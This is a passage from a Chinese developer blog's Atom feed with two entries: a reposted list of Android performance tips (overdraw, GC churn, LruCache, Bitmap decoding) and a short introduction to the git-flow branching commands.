<p>2.Overdraw(过度绘制)问题，就是同一个区域被多次绘制，通过手机设置里面的开发者选项，打开Show GPU Overdraw的选项，可以观察UI上的Overdraw情况。蓝色（绘制1次），淡绿（绘制2次），淡红（绘制3次），深红（绘制4次）代表了4种不同程度的Overdraw情况，我们的目标就是尽量减少红色Overdraw，看到更多的蓝色区域。</p>
<p>3.打开手机里面的开发者选项，选择Profile GPU Rendering，选中On screen as bars的选项。通过这个工具查看每一帧绘制的时间。</p>
<p>4.自定义view时通过canvas.clipRect()来确定需要刷新的区域，选定区域外的地方刷新绘制时会被忽略，以此来减少Overdraw提升流畅度。还可以使用canvas.quickreject()来判断是否没和某个矩形相交，从而跳过那些非矩形区域内的绘制操作。</p>
<p>5.java内存回收GC调用的时候会暂停所有的线程，包括UI线程，所以频繁的调用GC也会感觉到卡顿。导致GC频繁调用的原因可能是：内存抖动即大量的对象被创建又在短时间内马上被释放；瞬间产生大量的对象会占用大量Young Generation的内存区域，达到阀值时剩余空间不够会触发GC。解决办法，在Memory Monitor里面查如果短时间发生了多次内存的涨跌，这意味着很有可能发生了内存抖动。代码规避的点有：避免在for循环里面分配对象占用内存；避免在onDraw方法里面执行复杂的操作，避免创建对象；对于无法避免的需要频繁创建的可以考虑使用对象池，但是对象池需要在不用时自己手动进行销毁。</p>
<p>6.有动画需要对Bitmap绘制时可以通过拆分，只单独绘制需要变化的部分，可以通过setLayerType()方法使得这个View强制用Hardware来进行渲染。对于动画使用PropertyAnimation或者ViewAnimation来操作实现，Android系统对这些Animation做过一定的优化处理。</p>
<p>7.减少for each的遍历使用，耗费时间较多的一种遍历方法。</p>
<p>8.缓存算法，android最常用的一个缓存算法是LRU(Least Recently Use)；需要注意LRU Cache中被淘汰对象的回收，否者会引起严重的内存泄露。LruCache的构建：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);</span><br><span class="line">intavailMemInBytes  = am.getMemoryClass()*<span class="number">1024</span>*<span class="number">1024</span>/<span class="number">8</span>;<span class="comment">//LruCache最合适的大小</span></span><br><span class="line">LruCache bitMapCache =newLruCache(availMemInBytes)&#123;</span><br><span class="line">    @<span class="function">Override</span><br><span class="line">    <span class="keyword">protected</span> <span class="title">intsizeOf</span><span class="params">(String key,Bitmap value)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//让Cache知道每个加入的Item的具体大小</span></span><br><span class="line">        returnvalue.getByteCount();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>9.试用Android Studio中工具栏的Analysis -&gt; Inspect Code的Lint，静态扫描应用源码并找出其中的潜在问题。</p>
<p>10.view如果不设置透明度绘制一次，如果设置了透明度绘制时至少会绘制两次。解决办法直接用GPU进行绘制，具体参考Hidden Cost of Transparency</p>
<p>11.提高自定义view的性能的方法：仅仅在View的内容发生改变的时候才去触发invalidate方法，尽量使用ClipRect等方法来提高绘制的性能；减少绘制时不必要的绘制元素，对于那些不可见的元素，我们需要尽量避免重绘；对于不在屏幕上的元素，可以使用Canvas.quickReject把他们给剔除，避免浪费CPU资源。另外尽量使用GPU来进行UI的渲染，这样能够极大的提高程序的整体表现性能。</p>
<p>12.图片不同的解码率占用的内存大小也不一样，选择合适的解码率可以防止oom的出现。<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BitmapFactory.<span class="keyword">Options</span> <span class="keyword">options</span> =newBitmapFactory.<span class="keyword">Options</span>();</span><br><span class="line"><span class="keyword">options</span>.inPreferredConfig= Bitmap.Config.ARGB_8888;<span class="comment">//需要的内存最大每个像素占8位</span></span><br><span class="line"><span class="keyword">options</span>.inPreferredConfig= Bitmap.Config.ARGB_4444;<span class="comment">//每个像素占4位</span></span><br><span class="line"><span class="keyword">options</span>.inPreferredConfig= Bitmap.Config.RGB_565;<span class="comment">//没有透明度R占5位 G占6位 B占5位</span></span><br><span class="line"><span class="keyword">options</span>.inPreferredConfig= Bitmap.Config.ALPHA_8;</span><br></pre></td></tr></table></figure></p>
<p>13.createScaledBitmap()可以快速的创建缩放的图片但是需要图片已经加载到内存中；options.inSampleSize属性同样可以实现缩放并且不用将图片加载到内存中；使用inScaled，inDensity，inTargetDensity的属性来对解码图片做处理也可以实现缩放；options.inJustDecodeBounds=true可以在不将图片加载到内存中的前提下读取图片的宽高等信息；</p>
<p>14.使用bitmapFactoryOptions.inBitmap属性来提高bitmap的循环试用，减少内存开销；使用inBitmap属性可以告知Bitmap解码器去尝试使用已经存在的内存区域，新解码的bitmap会尝试去使用之前那张bitmap在heap中所占据的pixel data内存区域，而不是去问内存重新申请一块区域来存放bitmap。试用限制：在SDK 11-&gt;18之间，重用的bitmap大小必须是一致的，例如给inBitmap赋值的图片大小为100-100，那么新申请的bitmap必须也为100-100才能够被重用。从SDK 19开始，新申请的bitmap大小必须小于或者等于已经赋值过的bitmap大小；新申请的bitmap与旧的bitmap必须有相同的解码格式，例如大家都是8888的，如果前面的bitmap是8888，那么就不能支持4444与565格式的bitmap了。</p>
<p>15.ArrayMap比HasMap更加的节省内存，遍历效率也比较高。但是数据最好不要超过千级。</p>
<p>16.Android中不推荐使用枚举（Enum），和静态常量相比，枚举会耗费更多的内存，编译后的文件也更大。</p>
<p>17.通常，View会保持Activity的引用，Activity同时还和其他内部对象也有可能保持引用关系。当屏幕发生旋转的时候，activity很容易发生泄漏，这样的话，里面的view也会发生泄漏。避免的规则有：避免使用异步回调，异步回调执行时可能activity已经被销毁；避免使用Static对象，static的生命周期过长，使用不当很可能导致leak；避免把View添加到没有清除机制的容器里面如：WeekHashMap。</p>
<p>转自：<a href="http://www.jianshu.com/p/402d7d4d4da4" target="_blank" rel="external">http://www.jianshu.com/p/402d7d4d4da4</a></p>
]]></content>
    <summary type="html">
    <![CDATA[简书上看到的一篇不错的文章]]>
    
    </summary>
    
      <category term="性能" scheme="http://www.xuanzhangjiong.xyz/tags/%E6%80%A7%E8%83%BD/"/>
    
      <category term="Android" scheme="http://www.xuanzhangjiong.xyz/categories/Android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Git Flow简介]]></title>
    <link href="http://www.xuanzhangjiong.xyz/2015/08/09/Git-Flow%E7%AE%80%E4%BB%8B/"/>
    <id>http://www.xuanzhangjiong.xyz/2015/08/09/Git-Flow简介/</id>
    <published>2015-08-09T08:37:14.000Z</published>
    <updated>2015-12-09T09:31:40.000Z</updated>
    <content type="html"><![CDATA[<h1 id="u5173_u4E8E"><a href="#u5173_u4E8E" class="headerlink" title="关于"></a>关于</h1><p>git-flow 是一个 git 扩展集，按 Vincent Driessen 的分支模型提供高层次的库操作。<br>这里，我介绍下它的简单用法。<br>当然，我也只会这么一点点小技巧。</p>
<h1 id="u5B89_u88C5"><a href="#u5B89_u88C5" class="headerlink" title="安装"></a>安装</h1><p>第一步当然，你必须要有一个git环境咯，我就不啰嗦了。<br>Mac下，有2种安装方式：<br>Homebrew:</p>
<p><code>brew install git-flow</code></p>
<p>Macports:</p>
<p><code>port install git-flow</code></p>
<p>没有上面两个包管理的童鞋自行GitHub吧。</p>
<h1 id="u5F00_u59CB"><a href="#u5F00_u59CB" class="headerlink" title="开始"></a>开始</h1><p>为了自定义你的项目，Git flow需要初始化过程。<br>初始化<br>使用 git-flow，从初始化一个现有的 git 库内开始:</p>
<p><code>git flow init</code></p>
<p>你必须回答几个关于分支的命名约定的问题。<br>建议使用默认值。</p>
<h1 id="u7279_u6027"><a href="#u7279_u6027" class="headerlink" title="特性"></a>特性</h1><p>为即将发布的版本开发新功能特性。<br>这通常只存在开发者的库中。</p>
<h2 id="u589E_u52A0_u65B0_u7279_u6027"><a href="#u589E_u52A0_u65B0_u7279_u6027" class="headerlink" title="增加新特性"></a>增加新特性</h2><p>新特性的开发是基于 ‘develop’ 分支的。<br>通过下面的命令开始开发新特性：</p>
<p><code>git flow feature start MYFEATURE</code></p>
<p>这个操作创建了一个基于’develop’的特性分支，并切换到这个分支之下。</p>
<h2 id="u5B8C_u6210_u65B0_u7279_u6027"><a href="#u5B8C_u6210_u65B0_u7279_u6027" class="headerlink" title="完成新特性"></a>完成新特性</h2><p>完成开发新特性。这个动作执行下面的操作。<br>合并 MYFEATURE 分支到 ‘develop’<br>删除这个新特性分支<br>切换回 ‘develop’ 分支</p>
<p><code>git flow feature finish MYFEATURE</code></p>
<h2 id="u53D1_u5E03_u65B0_u7279_u6027"><a href="#u53D1_u5E03_u65B0_u7279_u6027" class="headerlink" title="发布新特性"></a>发布新特性</h2><p>你是否合作开发一项新特性？<br>发布新特性分支到远程服务器，所以，其它用户也可以使用这分支。</p>
<p><code>git flow feature publish MYFEATURE</code></p>
<h2 id="u53D6_u5F97_u4E00_u4E2A_u53D1_u5E03_u7684_u65B0_u7279_u6027_u5206_u652F"><a href="#u53D6_u5F97_u4E00_u4E2A_u53D1_u5E03_u7684_u65B0_u7279_u6027_u5206_u652F" class="headerlink" title="取得一个发布的新特性分支"></a>取得一个发布的新特性分支</h2><p>取得其它用户发布的新特性分支，并签出远程的变更。</p>
<p><code>git flow feature pull MYFEATURE</code></p>
<h1 id="u4F5C_u4E00_u4E2Arelease_u7248_u672C"><a href="#u4F5C_u4E00_u4E2Arelease_u7248_u672C" class="headerlink" title="作一个release版本"></a>作一个release版本</h1><p>支持一个新的用于生产环境的发布版本。<br>允许修正小问题，并为发布版本准备元数据。</p>
<h2 id="u5F00_u59CB_u51C6_u5907release_u7248_u672C"><a href="#u5F00_u59CB_u51C6_u5907release_u7248_u672C" class="headerlink" title="开始准备release版本"></a>开始准备release版本</h2><p>开始准备release版本，使用 git flow release 命令.<br>它从 ‘develop’ 分支开始创建一个 release 分支。</p>
<p><code>git flow release start RELEASE [BASE]</code></p>
<p>你可以选择提供一个 [BASE]参数，即提交记录的 sha-1 hash 值，来开启动 release 分支. 这个提交记录的 sha-1 hash 值必须是’develop’ 分支下的。<br>创建 release 分支之后立即发布允许其它用户向这个 release 分支提交内容是个明智的做法。命令十分类似发布新特性：</p>
<p><code>git flow release publish RELEASE</code></p>
<p>(你可以通过 <code>git flow release track RELEASE</code>命令签出 release 版本的远程变更)</p>
<h2 id="u5B8C_u6210release_u7248_u672C"><a href="#u5B8C_u6210release_u7248_u672C" class="headerlink" title="完成release版本"></a>完成release版本</h2><p>完成 release 版本是一个大 git 分支操作。它执行下面几个动作：<br>归并 release 分支到 ‘master’ 分支<br>用 release 分支名打 Tag<br>归并 release 分支到 ‘develop’<br>移除 release 分支</p>
<p><code>git flow release finish RELEASE</code></p>
<h1 id="u7D27_u6025_u4FEE_u590D"><a href="#u7D27_u6025_u4FEE_u590D" class="headerlink" title="紧急修复"></a>紧急修复</h1><p>紧急修复来自这样的需求：生产环境的版本处于一个不预期状态，需要立即修正。<br>有可能是需要修正 master 分支上某个 TAG 标记的生产版本。</p>
<h2 id="u5F00_u59CBgit_flow_u7D27_u6025_u4FEE_u590D"><a href="#u5F00_u59CBgit_flow_u7D27_u6025_u4FEE_u590D" class="headerlink" title="开始git flow紧急修复"></a>开始git flow紧急修复</h2><p>像其它 git flow 命令一样, 紧急修复分支开始自：</p>
<p><code>git flow hotfix start VERSION [BASENAME]</code></p>
<p>VERSION 参数标记着修正版本。你可以从 [BASENAME]开始，[BASENAME]为finish release时填写的版本号</p>
<h2 id="u5B8C_u6210_u7D27_u6025_u4FEE_u590D"><a href="#u5B8C_u6210_u7D27_u6025_u4FEE_u590D" class="headerlink" title="完成紧急修复"></a>完成紧急修复</h2><p>当完成紧急修复分支，代码归并回 develop 和 master 分支。相应地，master 分支打上修正版本的 TAG。</p>
<p><code>git flow hotfix finish VERSION</code></p>
]]></content>
    <summary type="html">
    <![CDATA[简化Git操作的神器]]>
    
    </summary>
    
      <category term="码农必备常识" scheme="http://www.xuanzhangjiong.xyz/tags/%E7%A0%81%E5%86%9C%E5%BF%85%E5%A4%87%E5%B8%B8%E8%AF%86/"/>
    
      <category term="Git" scheme="http://www.xuanzhangjiong.xyz/categories/Git/"/>
    
  </entry>
  
</feed>
